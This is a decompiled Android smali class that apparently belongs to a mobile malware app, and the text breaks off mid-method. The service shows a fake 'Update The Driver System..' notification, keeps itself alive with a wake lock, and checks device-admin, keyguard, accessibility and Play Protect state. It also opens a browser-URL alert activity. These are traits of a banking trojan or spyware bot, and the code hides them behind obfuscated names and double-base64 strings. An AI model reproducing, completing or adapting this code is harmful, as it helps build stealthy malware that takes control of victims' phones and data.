.class public Lnaqsl/ebxcb/exu/StartWhileGlobal;
.super Landroid/app/IntentService;
.source ""


# static fields
.field static byte:Lnaqsl/ebxcb/exu/int;


# instance fields
.field fddo:Lnaqsl/ebxcb/exu/ifdf;

.field for:Lnaqsl/ebxcb/exu/for;

.field ifdf:Lnaqsl/ebxcb/exu/int;

.field private int:Landroid/app/Notification;

.field new:Ljava/lang/String;

.field try:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .registers 1

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    sput-object v0, Lnaqsl/ebxcb/exu/StartWhileGlobal;->byte:Lnaqsl/ebxcb/exu/int;

    return-void
.end method

.method public constructor <init>()V
    .registers 2

    const-string v0, "StartWhileGlobal"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lnaqsl/ebxcb/exu/ifdf;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/ifdf;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/StartWhileGlobal;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/StartWhileGlobal;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v0, Lnaqsl/ebxcb/exu/for;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/for;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/StartWhileGlobal;->for:Lnaqsl/ebxcb/exu/for;

    const-class v0, Lnaqsl/ebxcb/exu/StartWhileGlobal;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lnaqsl/ebxcb/exu/StartWhileGlobal;->new:Ljava/lang/String;

    return-void
.end method

.method private fddo()V
    .registers 3

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lnaqsl/ebxcb/exu/StartWhileGlobal$fddo;

    invoke-direct {v1, p0}, Lnaqsl/ebxcb/exu/StartWhileGlobal$fddo;-><init>(Lnaqsl/ebxcb/exu/StartWhileGlobal;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private ifdf()V
    .registers 3
    .annotation build Landroid/annotation/TargetApi;
        value = 0x10
    .end annotation

    :try_start_0
    new-instance v0, Landroid/app/Notification$Builder;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    invoke-direct {v0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    const-string v1, "U1c1bWJ3PT0="

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const-string v1, "VlhCa1lYUmxJRlJvWlNCRWNtbDJaWElnVTNsemRHVnRMaTQ9"

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const/high16 v1, 0x7f040000

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    iput-object v0, p0, Lnaqsl/ebxcb/exu/StartWhileGlobal;->int:Landroid/app/Notification;

    const/16 v0, 0x26b2

    iget-object v1, p0, Lnaqsl/ebxcb/exu/StartWhileGlobal;->int:Landroid/app/Notification;

    invoke-virtual {p0, v0, v1}, Landroid/app/IntentService;->startForeground(ILandroid/app/Notification;)V
    :try_end_36
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_36} :catch_36

    :catch_36
    return-void
.end method


# virtual methods
.method protected onHandleIntent(Landroid/content/Intent;)V
    .registers 27

    move-object/from16 v1, p0

    const-string v2, "ZFhKc2N3PT0="

    const-string v3, "YzNkemNHRmphMlYw"

    const-string v4, "power"

    const-string v5, "Y0d4aGVWOXdjbTkwWldOMA=="

    const-string v6, "YVc1MFpYSjJZV3c9"

    const-string v7, "ZEdsdFpWOTNiM0py"

    iput-object v1, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    new-instance v8, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v8}, Lnaqsl/ebxcb/exu/int;-><init>()V

    const/4 v9, 0x1

    :try_start_16
    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    invoke-virtual {v0, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    iget-object v10, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->new:Ljava/lang/String;

    invoke-virtual {v0, v9, v10}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    if-eqz v0, :cond_29

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->acquire()V
    :try_end_29
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_29} :catch_29

    :catch_29
    :cond_29
    :try_start_29
    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v8, v1, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0
    :try_end_35
    .catch Ljava/lang/Exception; {:try_start_29 .. :try_end_35} :catch_3a

    if-nez v0, :cond_38

    goto :goto_3a

    :cond_38
    const/4 v0, 0x1

    goto :goto_3b

    :catch_3a
    :goto_3a
    const/4 v0, 0x0

    :goto_3b
    if-nez v0, :cond_40

    :try_start_3d
    invoke-virtual {v8, v1}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;)V
    :try_end_40
    .catch Ljava/lang/Exception; {:try_start_3d .. :try_end_40} :catch_40

    :catch_40
    :cond_40
    const/4 v0, -0x1

    :try_start_41
    iget-object v11, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v8, v11, v12}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v11
    :try_end_53
    .catch Ljava/lang/Exception; {:try_start_41 .. :try_end_53} :catch_54

    goto :goto_56

    :catch_54
    const/16 v11, 0x1388

    :goto_56
    :try_start_56
    invoke-static {v7}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v8, v1, v12}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12
    :try_end_66
    .catch Ljava/lang/Exception; {:try_start_56 .. :try_end_66} :catch_6a

    move/from16 v16, v11

    const/4 v11, 0x0

    goto :goto_83

    :catch_6a
    invoke-static {v7}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const-string v13, "TUE9PQ=="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v8, v1, v12, v13}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    move/from16 v16, v11

    const/4 v11, 0x0

    const/4 v12, 0x0

    :goto_83
    const/4 v13, -0x1

    const/4 v14, 0x0

    const/4 v15, 0x0

    :goto_86
    :try_start_86
    sget-object v0, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;
    :try_end_88
    .catch Ljava/lang/InterruptedException; {:try_start_86 .. :try_end_88} :catch_92

    move/from16 v17, v11

    const-wide/16 v10, 0x3e8

    :try_start_8c
    invoke-virtual {v0, v10, v11}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_8f
    .catch Ljava/lang/InterruptedException; {:try_start_8c .. :try_end_8f} :catch_90

    goto :goto_98

    :catch_90
    move-exception v0

    goto :goto_95

    :catch_92
    move-exception v0

    move/from16 v17, v11

    :goto_95
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_98
    const-string v0, "device_policy"

    invoke-virtual {v1, v0}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v0, Landroid/content/ComponentName;

    iget-object v10, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v11, Lnaqsl/ebxcb/exu/fddo/fddo/fddo;

    invoke-direct {v0, v10, v11}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v10, 0x10000000

    :try_start_ab
    iget-object v11, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v18

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v8, v11, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-gt v0, v9, :cond_ec

    new-instance v0, Landroid/content/Intent;

    const-class v11, Lnaqsl/ebxcb/exu/Activity/ActivityAlert2;

    invoke-direct {v0, v1, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v11, "YzNSaGNuUT0="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v18, "WkdWc1pYUmxRWEJ3"

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v18

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v11, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v9, 0x40000000    # 2.0f

    invoke-virtual {v0, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v0}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V

    invoke-virtual/range {p0 .. p0}, Landroid/app/IntentService;->stopSelf()V
    :try_end_ec
    .catch Ljava/lang/Exception; {:try_start_ab .. :try_end_ec} :catch_ec

    :catch_ec
    :cond_ec
    :try_start_ec
    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-string v9, "YzNSaGNuUkJiR0Z5YlE9PQ=="

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    iget-object v11, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v18

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v8, v11, v10}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v10

    int-to-long v10, v10

    invoke-static {v0, v9, v10, v11}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;J)V
    :try_end_10e
    .catch Ljava/lang/Exception; {:try_start_ec .. :try_end_10e} :catch_10f

    goto :goto_124

    :catch_10f
    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-string v9, "WXpOU2FHTnVVa0ppUjBaNVlsRTlQUT09"

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    const-wide/16 v10, 0x2710

    invoke-static {v0, v9, v10, v11}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;J)V

    :goto_124
    const-string v0, "keyguard"

    invoke-virtual {v1, v0}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/app/KeyguardManager;

    invoke-virtual {v9}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v9

    const-string v10, "Wm05eWNHMD0="

    const-string v11, "Wm1Gc2MyVT0="

    const-string v18, "dHJ1ZQ=="

    if-eqz v9, :cond_19c

    const-string v19, "Wm05eVpXZHliM1Z1Wkhkb2FXeGw="

    invoke-static/range {v19 .. v19}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    move/from16 v20, v13

    invoke-static/range {v19 .. v19}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v8, v1, v13}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    move-object/from16 v19, v3

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v13, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1d1

    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v13, 0x1a

    if-lt v3, v13, :cond_198

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v8, v1, v3}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v3, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_1d1

    const-string v3, "VWpJNWRsb3llR3c9"

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v13, "VlhCa1lYUnBibWNnVTNsemRHVnQ="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v8, v1, v3, v13}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/app/Service;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    goto :goto_1ce

    :cond_198
    invoke-direct/range {p0 .. p0}, Lnaqsl/ebxcb/exu/StartWhileGlobal;->ifdf()V

    goto :goto_1d1

    :cond_19c
    move-object/from16 v19, v3

    move/from16 v20, v13

    const/4 v3, 0x1

    invoke-virtual {v1, v3}, Landroid/app/IntentService;->stopForeground(Z)V

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v8, v1, v3}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v3, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_1d1

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    :goto_1ce
    invoke-virtual {v8, v1, v3, v10}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_1d1
    :goto_1d1
    add-int/lit8 v10, v17, 0x2

    iget-object v3, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    invoke-virtual {v8, v3}, Lnaqsl/ebxcb/exu/int;->new(Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_1f1

    iget-object v3, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-string v13, "YVhOQlkyTmxjM05pYVd4cGRIaz0="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    move-object/from16 v17, v0

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v8, v3, v13, v0}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_20a

    :cond_1f1
    move-object/from16 v17, v0

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-string v3, "YVhOQlkyTmxjM05pYVd4cGRIaz0="

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v8, v0, v3, v13}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :goto_20a
    invoke-virtual {v8, v1}, Lnaqsl/ebxcb/exu/int;->this(Landroid/content/Context;)Z

    move-result v0

    const-string v3, ""

    if-eqz v0, :cond_338

    invoke-virtual {v8, v1}, Lnaqsl/ebxcb/exu/int;->new(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_21a

    goto/16 :goto_338

    :cond_21a
    const-string v0, "YVhOR2FYSnpkRWx1YzNSaGJHdz0="

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v8, v1, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v0, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_299

    :try_start_232
    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "https://google.com"

    const-string v13, "YVhOR2FYSnpkRWx1YzNSaGJHdz0="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v21
    :try_end_247
    .catch Ljava/lang/Exception; {:try_start_232 .. :try_end_247} :catch_299

    move-object/from16 v22, v6

    :try_start_249
    invoke-static/range {v21 .. v21}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v8, v1, v13, v6}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v6, Landroid/content/Intent;

    const-class v13, Lnaqsl/ebxcb/exu/Activity/ActivityAlert2;

    invoke-direct {v6, v1, v13}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v13, "WXpOU2FHTnVVVDA9"

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13
    :try_end_265
    .catch Ljava/lang/Exception; {:try_start_249 .. :try_end_265} :catch_29b

    move/from16 v21, v15

    :try_start_267
    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V

    const-string v23, "S2lwemRHRnlkR0p5ZFhKc0tpbz0="

    invoke-static/range {v23 .. v23}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v23
    :try_end_272
    .catch Ljava/lang/Exception; {:try_start_267 .. :try_end_272} :catch_296

    move/from16 v24, v14

    :try_start_274
    invoke-static/range {v23 .. v23}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v15, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v13, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const/high16 v6, 0x10000000

    invoke-virtual {v0, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v6, 0x40000000    # 2.0f

    invoke-virtual {v0, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v0}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V
    :try_end_293
    .catch Ljava/lang/Exception; {:try_start_274 .. :try_end_293} :catch_294

    goto :goto_29f

    :catch_294
    nop

    goto :goto_29f

    :catch_296
    move/from16 v24, v14

    goto :goto_29f

    :catch_299
    :cond_299
    move-object/from16 v22, v6

    :catch_29b
    move/from16 v24, v14

    move/from16 v21, v15

    :goto_29f
    const-string v0, "YVhOWGIzSnJhVzVu"

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v8, v1, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_356

    :try_start_2bb
    new-instance v0, Lnaqsl/ebxcb/exu/fddo/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/fddo/int;-><init>()V

    iget-object v6, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    iget-object v6, v6, Lnaqsl/ebxcb/exu/ifdf;->new:Ljava/lang/String;

    invoke-virtual {v0, v6, v3}, Lnaqsl/ebxcb/exu/fddo/int;->ifdf(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_356

    const-string v6, "PHRhZz4="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_356

    const-string v6, "WVVoU01HTkJQVDA9"

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_356

    const-string v6, "T2k4dg=="

